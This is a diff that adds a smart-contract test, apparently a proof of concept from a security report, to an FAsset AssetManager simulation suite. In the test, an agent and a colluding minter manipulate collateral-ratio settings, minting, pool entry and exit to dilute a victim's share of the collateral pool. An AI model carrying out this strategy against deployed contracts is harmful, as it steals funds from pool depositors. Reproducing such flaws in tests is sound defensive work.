@@ -1,6 +1,6 @@
 import { expectEvent, expectRevert } from "@openzeppelin/test-helpers";
 import { DAYS, deepFormat, MAX_BIPS, toBIPS, toBN, toBNExp, toWei } from "../../../lib/utils/helpers";
-import { MockChain } from "../../utils/fasset/MockChain";
+import { MockChain, MockChainWallet } from "../../utils/fasset/MockChain";
 import { MockFlareDataConnectorClient } from "../../utils/fasset/MockFlareDataConnectorClient";
 import { deterministicTimeIncrease, getTestFile, loadFixtureCopyVars } from "../../utils/test-helpers";
 import { assertWeb3Equal } from "../../utils/web3assertions";
@@ -925,4 +925,58 @@ contract(`AssetManager.sol; ${getTestFile(__filename)}; Asset manager simulation
         assertWeb3Equal(victimNatBefore, victimNatAfter)
     });
 
+    it("47020: agent dilutes collateral pool by setting topup CR below pool minting CR", async () => {
+
+        async function userPoolCollateral(user: string): Promise<BN> {
+            const userTokens = await agent.collateralPoolToken.balanceOf(user)
+            const tokens = await agent.collateralPoolToken.totalSupply()
+            const collateral = await agent.collateralPool.totalCollateral()
+            return userTokens.mul(collateral).div(tokens)
+        }
+
+        // define minter and agent with malicious settings (for simplicity, assume they are collaborating)
+        const minter = await Minter.createTest(context, minterAddress1, underlyingMinter1, context.underlyingAmount(1000000));
+        const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1, {
+            poolFeeShareBIPS: 0,
+            mintingPoolCollateralRatioBIPS: 20_000,
+            poolTopupCollateralRatioBIPS: 30_000,
+            poolExitCollateralRatioBIPS: 30_001,
+            poolTopupTokenPriceFactorBIPS: 9500
+        });
+
+        // Make agent available and deposit some collateral
+        // NOTE: wei of vault collateral should be priced higher than wei of pool for this test
+        const fullAgentCollateral = toWei(3e8);
+        await agent.depositCollateralsAndMakeAvailable(fullAgentCollateral, fullAgentCollateral);
+        // update block, passing agent creation block
+        await context.updateUnderlyingBlock();
+
+        // victim enters agent's collateral pool
+        const victim = accounts[81]
+        await agent.collateralPool.enter(0, false, { from: victim, value: fullAgentCollateral })
+        const victimNatBefore = await userPoolCollateral(victim)
+
+        // ---- start malicious strategy (can be iterated) -----
+
+        // perform minting for all free lots to drop agent CR to mintingPoolCollateralRatioBIPS < poolTopupCollateralRatioBIPS
+        const freeLots = (await agent.getAgentInfo()).freeCollateralLots
+        await minter.performMinting(agent.agentVault.address, freeLots)
+        // minter enters the collateral pool to buy tokens
+        const tx = await agent.collateralPool.enter(0, false, { from: minter.address, value: fullAgentCollateral })
+        const receivedPoolTokens = toBN(requiredEventArgs(tx, "Entered").receivedTokensWei)
+        // the agent self-closes minter's FAssets to raise the CR
+        await context.fAsset.transfer(agent.ownerWorkAddress, context.convertLotsToUBA(freeLots), { from: minter.address })
+        await agent.selfClose(context.convertLotsToUBA(freeLots))
+        // agent waits for the collateral pool token timelock to expire and exits
+        await deterministicTimeIncrease(context.settings.collateralPoolTokenTimelockSeconds)
+        await agent.collateralPool.exit(receivedPoolTokens, 0, { from: minter.address })
+
+        // ---- end malicious strategy (can be iterated) -----
+
+        // check that victim had collateral pool native balance stolen
+        const victimNatAfter = await userPoolCollateral(victim)
+        console.log('victim balance before:', victimNatAfter.toString())
+        console.log('victim balance after :', victimNatBefore.toString())
+        assert(victimNatAfter.lt(victimNatBefore))
+    })
 });
